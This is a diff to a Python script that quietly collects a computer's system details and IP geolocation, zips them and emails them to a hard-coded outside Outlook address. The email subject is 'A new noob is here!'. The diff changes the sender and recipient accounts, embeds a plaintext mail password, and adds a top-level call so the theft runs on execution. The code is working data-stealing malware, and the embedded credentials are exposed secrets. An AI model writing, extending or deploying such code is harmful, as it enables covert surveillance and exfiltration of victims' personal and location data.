@@ -29,7 +29,9 @@ def sendMail():
     f2.write(outInfoPC)
     f2.close()
 
-    ipInfo = json.loads(os.popen('curl ipinfo.io').read())
+    # ipInfo = json.loads(os.popen('curl ipinfo.io').read())
+    # ipInfo = json.dumps(os.popen('curl ipinfo.io').read(), indent=4)
+    ipInfo = os.popen('curl ipinfo.io').read()
     OSName = os.popen('ver').read()
 
     f3 = open(f"{pathFolder}ipinfo.json", "w")
@@ -39,32 +41,34 @@ def sendMail():
 
     subject = f"A new noob is here!"
     #json.dumps(ipInfo)
-    message = f'''IP : {ipInfo['ip']}
-    Hostname : {ipInfo['hostname']}
-    City : {ipInfo['city']}
-    Region : {ipInfo['region']}
-    Postal Code : {ipInfo['postal']}
-    Country code : {ipInfo['country']}
-    Coordinates : {ipInfo['loc']}
-    Organization : {ipInfo['org']}
-    Timezone : {ipInfo['timezone']}
+    # message = f'''IP : {ipInfo['ip']}
+    # Hostname : {ipInfo['hostname']}
+    # City : {ipInfo['city']}
+    # Region : {ipInfo['region']}
+    # Postal Code : {ipInfo['postal']}
+    # Country code : {ipInfo['country']}
+    # Coordinates : {ipInfo['loc']}
+    # Organization : {ipInfo['org']}
+    # Timezone : {ipInfo['timezone']}
 
-    OS : ${OSName}
-    '''
+    # OS : ${OSName}
+    # '''
+    message="Nice to meet you :)"
 
 
-    FROM_EMAIL = 'blazzoraquagta@outlook.com'
-    TO_EMAIL = FROM_EMAIL
+    FROM_EMAIL = 'envoyeurg12@outlook.com'
+    TO_EMAIL = 'plasticeaterg12@outlook.com'
     #]>=8gY2^V~FtpKS
-    PASSWORD = "TestPasswordForPython"
+    PASSWORD = "SalutEnvoyeur-07-06.24"
 
 
     # smtp.gmail.com
+    # smtp-mail.outlook.com',587
     try:
-        gmail = smtplib.SMTP('smtp-mail.outlook.com',587)
-        gmail.ehlo()
-        gmail.starttls()
-        gmail.login(FROM_EMAIL,PASSWORD)
+        mail = smtplib.SMTP('smtp-mail.outlook.com',587)
+        mail.ehlo()
+        mail.starttls()
+        mail.login(FROM_EMAIL,PASSWORD)
     except:
         print("Couldn't setup email!!") 
 
@@ -85,7 +89,7 @@ def sendMail():
     # files = ["ipconfig.txt"]
     msg.attach(MIMEText(message, 'plain', 'utf-8'))
 
-
+    print("weshhh")
 
     zipName = f"{str(datetime.datetime.today()).replace(' ', '_').replace(':', '-').split('.')[0]}_{json.loads(os.popen('curl ipinfo.io').read())['ip']}"
     print(zipName)
@@ -109,6 +113,8 @@ def sendMail():
 
 
         
-    gmail.send_message(msg)
+    mail.send_message(msg)
 
-    gmail.close()
+    mail.close()
+
+sendMail()
